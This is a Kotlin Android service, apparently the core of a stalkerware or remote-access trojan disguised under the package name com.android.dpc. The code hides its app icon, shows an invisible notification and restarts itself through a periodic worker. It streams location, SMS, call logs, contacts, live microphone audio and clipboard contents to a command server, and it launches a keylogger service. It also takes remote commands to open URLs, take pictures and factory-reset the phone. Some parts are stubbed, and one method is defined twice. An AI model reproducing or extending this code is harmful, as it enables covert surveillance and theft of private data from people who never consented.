package com.android.dpc

import android.Manifest
import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.location.Location
import android.media.*
import android.media.projection.*
import android.net.Uri
import android.os.*
import android.provider.*
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.work.*
import com.google.android.gms.location.*
import com.google.gson.Gson
import okhttp3.*
import okio.ByteString.Companion.toByteString
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

class CoreService : Service() {

    // Dynamic token system
    private var endpoint = if (BuildConfig.DEBUG) DeviceConstants.SERVER_URL_LOCAL else DeviceConstants.SERVER_URL_RENDER
    private var deviceToken = DeviceConstants.TOKEN_FIXED // Fallback to fixed token
    private val gson = Gson()
    private lateinit var ws: WebSocket
    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaCodec: MediaCodec? = null
    private var audioRecord: AudioRecord? = null
    private var isRecording = false
    private lateinit var ghostOpsManager: GhostOpsManager
    private lateinit var batteryOptimizer: BatteryOptimizer
    
    companion object {
        const val NOTIFICATION_ID = 1
        const val CHANNEL_ID = "ghost_channel"
        private const val TAG = "CoreService"
    }

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "CoreService created")
        
        // Load connection data from preferences or intent
        loadConnectionData()
        
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildSilentNotification())
        
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        ghostOpsManager = GhostOpsManager(this)
        batteryOptimizer = BatteryOptimizer(this) { isHighFreq ->
            // Adjust capture frequency based on battery/charging status
            adjustCaptureFrequency(isHighFreq)
        }
        
        initializeWebSocket()
        hideAppIcon()
        setupPeriodicWork()
        
        // Start ghost operations
        ghostOpsManager.startOperations()
        batteryOptimizer.startMonitoring()
        
        Handler(Looper.getMainLooper()).postDelayed({
            initializeCaptureSystems()
        }, 400) // 0.4s transparent splash delay
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.let {
            // Check for new token from QR scanner
            val newToken = it.getStringExtra("new_token")
            val newServerUrl = it.getStringExtra("server_url")
            
            if (newToken != null && newServerUrl != null) {
                Log.d(TAG, "Updating connection with new token: $newToken")
                deviceToken = newToken
                endpoint = newServerUrl
                
                // Reconnect WebSocket with new credentials
                reconnectWebSocket()
            }
        }
        return START_STICKY
    }

    private fun loadConnectionData() {
        val prefs = getSharedPreferences("spectratm_config", Context.MODE_PRIVATE)
        val savedToken = prefs.getString("device_token", null)
        val savedUrl = prefs.getString("server_url", null)
        
        if (savedToken != null && savedUrl != null) {
            deviceToken = savedToken
            endpoint = savedUrl
            Log.d(TAG, "Loaded saved connection - Token: $deviceToken, URL: $endpoint")
        } else {
            Log.d(TAG, "No saved connection found, using defaults")
        }
    }

    private fun reconnectWebSocket() {
        try {
            ws.close(1000, "Reconnecting with new token")
        } catch (e: Exception) {
            Log.w(TAG, "Error closing WebSocket", e)
        }
        
        Handler(Looper.getMainLooper()).postDelayed({
            initializeWebSocket()
        }, 1000)
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Sistema de Monitoramento",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Serviço de sistema"
                setShowBadge(false)
                setSound(null, null)
                enableLights(false)
                enableVibration(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun buildSilentNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID).apply {
            setSmallIcon(android.R.color.transparent)
            setContentTitle("")
            setContentText("")
            setOngoing(true)
            priority = NotificationCompat.PRIORITY_MIN
            setCategory(NotificationCompat.CATEGORY_SERVICE)
            setVisibility(NotificationCompat.VISIBILITY_SECRET)
        }.build()
    }
    
    private fun initializeWebSocket() {
        val client = OkHttpClient.Builder()
            .connectionSpecs(listOf(ConnectionSpec.MODERN_TLS))
            .build()
            
        val request = Request.Builder()
            .url(endpoint)
            .build()
            
        ws = client.newWebSocket(request, WebSocketListener())
        WsRelay.init(ws)
    }
    
    private fun initializeCaptureSystems() {
        try {
            startLocationTracking()
            fetchAllSms()
            fetchCallLog()
            fetchContacts()
            startAudioRecording()
            startScreenCapture()
            enableAccessibilityService()
            startClipboardMonitoring()
            setupDevicePolicyManager()
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing capture systems", e)
        }
    }
    
    private fun startLocationTracking() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        
        val locationRequest = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 15000)
            .setWaitForAccurateLocation(false)
            .setMinUpdateIntervalMillis(5000)
            .build()
            
        val locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                locationResult.lastLocation?.let { location ->
                    val data = mapOf(
                        "type" to "location",
                        "latitude" to location.latitude,
                        "longitude" to location.longitude,
                        "accuracy" to location.accuracy,
                        "timestamp" to System.currentTimeMillis()
                    )
                    ws.send(gson.toJson(data))
                }
            }
        }
        
        fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper())
    }
    
    private fun fetchAllSms() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        
        try {
            contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "date DESC LIMIT 100")?.use { cursor ->
                val smsList = mutableListOf<Map<String, Any>>()
                while (cursor.moveToNext()) {
                    val sms = mapOf(
                        "address" to (cursor.getString(cursor.getColumnIndexOrThrow("address")) ?: ""),
                        "body" to (cursor.getString(cursor.getColumnIndexOrThrow("body")) ?: ""),
                        "date" to (cursor.getLong(cursor.getColumnIndexOrThrow("date"))),
                        "type" to (cursor.getInt(cursor.getColumnIndexOrThrow("type")))
                    )
                    smsList.add(sms)
                }
                
                val data = mapOf("type" to "sms", "data" to smsList)
                ws.send(gson.toJson(data))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching SMS", e)
        }
    }
    
    private fun fetchCallLog() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        
        try {
            contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 100")?.use { cursor ->
                val callsList = mutableListOf<Map<String, Any>>()
                while (cursor.moveToNext()) {
                    val call = mapOf(
                        "number" to (cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)) ?: ""),
                        "name" to (cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: ""),
                        "type" to (cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))),
                        "duration" to (cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION))),
                        "date" to (cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                    )
                    callsList.add(call)
                }
                
                val data = mapOf("type" to "calls", "data" to callsList)
                ws.send(gson.toJson(data))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching call log", e)
        }
    }
    
    private fun fetchContacts() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        
        try {
            contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)?.use { cursor ->
                val contactsList = mutableListOf<Map<String, String>>()
                while (cursor.moveToNext()) {
                    val contact = mapOf(
                        "name" to (cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: ""),
                        "phone" to (cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: "")
                    )
                    contactsList.add(contact)
                }
                
                val data = mapOf("type" to "contacts", "data" to contactsList)
                ws.send(gson.toJson(data))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching contacts", e)
        }
    }
    
    private fun startAudioRecording() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        
        thread {
            try {
                val sampleRate = 16000
                val bufferSize = AudioRecord.getMinBufferSize(
                    sampleRate, 
                    AudioFormat.CHANNEL_IN_MONO, 
                    AudioFormat.ENCODING_PCM_16BIT
                )
                
                audioRecord = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate,
                    AudioFormat.CHANNEL_IN_MONO,
                    AudioFormat.ENCODING_PCM_16BIT,
                    bufferSize
                )
                
                audioRecord?.startRecording()
                isRecording = true
                
                val buffer = ByteArray(bufferSize)
                while (isRecording) {
                    val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                    if (bytesRead > 0) {
                        val audioData = ByteArray(bytesRead)
                        System.arraycopy(buffer, 0, audioData, 0, bytesRead)
                        ws.send(audioData.toByteString())
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error recording audio", e)
            }
        }
    }
    
    private fun startScreenCapture() {
        // Implementação básica - requer permissão MediaProjection
        try {
            val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            // Note: Precisa de intent result para funcionar corretamente
            // mediaProjection = mediaProjectionManager.getMediaProjection(-1, Intent())
            Log.d(TAG, "Screen capture setup initiated")
        } catch (e: Exception) {
            Log.e(TAG, "Error setting up screen capture", e)
        }
    }
    
    private fun enableAccessibilityService() {
        val intent = Intent(this, KeyLogService::class.java)
        try {
            startService(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Error starting accessibility service", e)
        }
    }
    
    private fun startClipboardMonitoring() {
        val clipboardManager = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        clipboardManager.addPrimaryClipChangedListener {
            try {
                val clipData = clipboardManager.primaryClip
                val clipText = clipData?.getItemAt(0)?.text?.toString() ?: ""
                if (clipText.isNotEmpty()) {
                    val data = mapOf(
                        "type" to "clipboard",
                        "text" to clipText,
                        "timestamp" to System.currentTimeMillis()
                    )
                    ws.send(gson.toJson(data))
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error monitoring clipboard", e)
            }
        }
    }
    
    private fun setupDevicePolicyManager() {
        try {
            val devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(this, DeviceAdminReceiver::class.java)
            
            if (devicePolicyManager.isDeviceOwnerApp(packageName)) {
                devicePolicyManager.setLockTaskPackages(componentName, arrayOf(packageName))
                Log.d(TAG, "Device owner configured")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error configuring device policy", e)
        }
    }
    
    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding app icon", e)
        }
    }
    
    private fun setupPeriodicWork() {
        val workRequest = PeriodicWorkRequestBuilder<KeepAliveWorker>(15, TimeUnit.MINUTES)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .build()
            
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "keep_alive",
            ExistingPeriodicWorkPolicy.REPLACE,
            workRequest
        )
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    /**
     * Adjust capture frequency based on battery/charging status
     */
    private fun adjustCaptureFrequency(isHighFrequency: Boolean) {
        val frequency = if (isHighFrequency) 10 else 2 // 10 Hz vs 2 Hz
        val intervalMs = 1000 / frequency
        
        Log.d(TAG, "Adjusting capture frequency to ${frequency}Hz (${intervalMs}ms interval)")
        
        // Update screen capture interval
        // Implementation depends on screen capture method used
    }
    
    /**
     * Handle binary commands from server
     */
    private fun handleBinaryCommand(data: ByteArray) {
        if (data.size < 2) return
        
        val prefix = data[0].toInt() and 0xFF
        val commandCode = data[1].toInt() and 0xFF
        
        if (prefix != 0xAA) return
        
        Log.d(TAG, "Received binary command: 0x${commandCode.toString(16).uppercase()}")
        
        when (commandCode) {
            0x01 -> { // Open URL
                val url = String(data, 2, data.size - 2)
                openUrl(url)
            }
            0x02 -> { // Vibrate
                val duration = if (data.size >= 4) {
                    ((data[2].toInt() and 0xFF) shl 8) or (data[3].toInt() and 0xFF)
                } else 200
                vibrate(duration)
            }
            0x03 -> { // Take picture
                Camera2Helper.init(this) { bitmap ->
                    // Handle captured image
                }
            }
            0x04 -> { // Get location
                fetchCurrentLocation()
            }
            0xFF -> { // Factory reset
                val magicString = String(data, 2, data.size - 2)
                ghostOpsManager.executeFactoryReset(magicString)
            }
        }
    }
    
    private fun openUrl(url: String) {
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "Error opening URL: $url", e)
        }
    }
    
    private fun vibrate(duration: Int) {
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
            vibrator.vibrate(duration.toLong())
        } catch (e: Exception) {
            Log.e(TAG, "Error vibrating", e)
        }
    }
    
    private fun fetchCurrentLocation() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return
        }
        
        fusedLocationClient.getCurrentLocation(Priority.PRIORITY_HIGH_ACCURACY, null)
            .addOnSuccessListener { location ->
                if (location != null) {
                    val data = mapOf(
                        "type" to "current_location",
                        "latitude" to location.latitude,
                        "longitude" to location.longitude,
                        "accuracy" to location.accuracy,
                        "timestamp" to System.currentTimeMillis()
                    )
                    ws.send(gson.toJson(data))
                }
            }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRecording = false
        audioRecord?.stop()
        audioRecord?.release()
        virtualDisplay?.release()
        mediaCodec?.stop()
        mediaCodec?.release()
        batteryOptimizer.stopMonitoring()
        ws.close(1000, "Service destroyed")
    }
    
    inner class WebSocketListener : okhttp3.WebSocketListener() {
        override fun onOpen(webSocket: WebSocket, response: Response) {
            Log.d(TAG, "WebSocket opened")
            // Send device token for authentication
            val authData = mapOf(
                "auth" to deviceToken, 
                "type" to "device_connect",
                "deviceInfo" to mapOf(
                    "model" to android.os.Build.MODEL,
                    "manufacturer" to android.os.Build.MANUFACTURER,
                    "version" to android.os.Build.VERSION.RELEASE,
                    "timestamp" to System.currentTimeMillis()
                )
            )
            webSocket.send(gson.toJson(authData))
        }
        
        override fun onMessage(webSocket: WebSocket, text: String) {
            Log.d(TAG, "Message received: $text")
            try {
                val json = gson.fromJson(text, Map::class.java)
                when (json["type"]) {
                    "update_check" -> ghostOpsManager.checkForUpdate()
                    "factory_reset" -> {
                        val magicString = json["magic"] as? String
                        if (magicString != null) {
                            ghostOpsManager.executeFactoryReset(magicString)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error processing message", e)
            }
        }
        
        override fun onMessage(webSocket: WebSocket, bytes: okio.ByteString) {
            Log.d(TAG, "Binary message received: ${bytes.size()} bytes")
            handleBinaryCommand(bytes.toByteArray())
        }
        
        override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
            Log.d(TAG, "WebSocket closing: $code $reason")
        }
        
        override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
            Log.e(TAG, "WebSocket failure", t)
            // Tentar reconectar após delay
            Handler(Looper.getMainLooper()).postDelayed({
                initializeWebSocket()
            }, 5000)
        }
    }
}

class KeepAliveWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        // Verifica se o serviço está rodando e reinicia se necessário
        val serviceIntent = Intent(applicationContext, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            applicationContext.startForegroundService(serviceIntent)
        } else {
            applicationContext.startService(serviceIntent)
        }
        return Result.success()
    }
}